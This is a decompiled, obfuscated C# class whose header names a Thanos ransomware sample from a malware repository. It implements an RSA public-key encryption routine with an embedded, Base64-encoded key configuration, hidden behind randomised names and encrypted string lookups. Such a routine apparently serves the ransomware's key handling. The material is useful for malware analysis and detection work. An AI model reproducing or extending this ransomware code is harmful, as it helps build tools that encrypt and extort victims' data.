// Decompiled with JetBrains decompiler
// Type: frgoWklvEOSV.FlpXYRWvTX
// Assembly: chaddad, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6BDE87D8-B0AC-468F-B40C-8A894553F651
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Thanos.gen-66ed5384220ff3091903e14a54849f824fdd13ac70dc4e0127eb59c1de801fc2.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace frgoWklvEOSV
{
  public static class FlpXYRWvTX
  {
    private static bool QHqhUxmYNLgFw;
    private static readonly string XLDTHwKdmajt;
    [NonSerialized]
    internal static GetString \u008F;

    public static string ZTvekdOmyg([In] string obj0)
    {
      int OPfmSiyNGzFxTlOi = 0;
      string fPzbhtlmbDZXN = FlpXYRWvTX.\u008F(107388735);
      FlpXYRWvTX.MkdigCRsEEMOX(FlpXYRWvTX.XLDTHwKdmajt, out OPfmSiyNGzFxTlOi, out fPzbhtlmbDZXN);
      return Convert.ToBase64String(FlpXYRWvTX.YEURKxvgnTup(Encoding.UTF8.GetBytes(obj0), OPfmSiyNGzFxTlOi, fPzbhtlmbDZXN));
    }

    private static byte[] YEURKxvgnTup([In] byte[] obj0, [In] int obj1, [In] string obj2)
    {
      if (obj0 == null || obj0.Length == 0)
        throw new ArgumentException(FlpXYRWvTX.\u008F(107402583), FlpXYRWvTX.\u008F(107402562));
      int num = FlpXYRWvTX.NmEJfVQfRMcT(obj1);
      if (obj0.Length > num)
        throw new ArgumentException(string.Format(FlpXYRWvTX.\u008F(107402553), (object) num), FlpXYRWvTX.\u008F(107402562));
      if (!FlpXYRWvTX.KNJuZPxStl(obj1))
        throw new ArgumentException(FlpXYRWvTX.\u008F(107402548), FlpXYRWvTX.\u008F(107402487));
      if (string.IsNullOrEmpty(obj2))
        throw new ArgumentException(FlpXYRWvTX.\u008F(107402506), FlpXYRWvTX.\u008F(107402477));
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(obj1))
      {
        cryptoServiceProvider.FromXmlString(obj2);
        return cryptoServiceProvider.Encrypt(obj0, FlpXYRWvTX.QHqhUxmYNLgFw);
      }
    }

    private static int NmEJfVQfRMcT([In] int obj0) => FlpXYRWvTX.QHqhUxmYNLgFw ? (obj0 - 384) / 8 + 7 : (obj0 - 384) / 8 + 37;

    private static bool KNJuZPxStl([In] int obj0) => obj0 >= 384 && obj0 <= 16384 && obj0 % 8 == 0;

    private static void MkdigCRsEEMOX(
      string IZpTbvGgqiuQ,
      out int OPfmSiyNGzFxTlOi,
      out string fPzbhtlmbDZXN)
    {
      OPfmSiyNGzFxTlOi = 0;
      fPzbhtlmbDZXN = FlpXYRWvTX.\u008F(107388735);
      if (IZpTbvGgqiuQ == null || IZpTbvGgqiuQ.Length <= 0)
        return;
      string str = Encoding.UTF8.GetString(Convert.FromBase64String(IZpTbvGgqiuQ));
      if (!str.Contains(FlpXYRWvTX.\u008F(107402428)))
        return;
      string[] strArray = str.Split(new char[1]{ '!' }, 2);
      try
      {
        OPfmSiyNGzFxTlOi = int.Parse(strArray[0]);
        fPzbhtlmbDZXN = strArray[1];
      }
      catch (Exception ex)
      {
      }
    }

    static FlpXYRWvTX()
    {
      Strings.CreateGetStringDelegate(typeof (FlpXYRWvTX));
      FlpXYRWvTX.QHqhUxmYNLgFw = false;
      FlpXYRWvTX.XLDTHwKdmajt = FlpXYRWvTX.\u008F(107402423);
    }
  }
}
